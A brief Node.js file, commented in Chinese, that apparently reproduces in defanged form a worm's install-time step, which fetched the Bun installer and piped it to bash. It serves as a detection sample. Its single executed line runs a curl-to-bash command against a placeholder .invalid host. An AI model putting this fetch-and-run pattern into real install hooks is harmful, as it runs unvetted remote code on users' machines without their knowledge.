import { execSync } from "node:child_process";

/**
 * 去武器化复刻：蠕虫的 Bun 运行时投放步骤。原事件经 package.json 的 preinstall 钩子
 * 在安装阶段执行本文件，下载 Bun 安装脚本并交给 shell 执行，随后在 Bun 运行时中
 * 跑载荷（绕过 Node 侧分析）。安装器 URL 已替换为 *.invalid；本文件仅保留
 * 「下载远程脚本 → 管道交给 bash」这一静态信号形态，不携带任何真实载荷。
 */
execSync("curl -fsSL https://cdn.example.invalid/get-bun.sh | bash", { stdio: "inherit" });
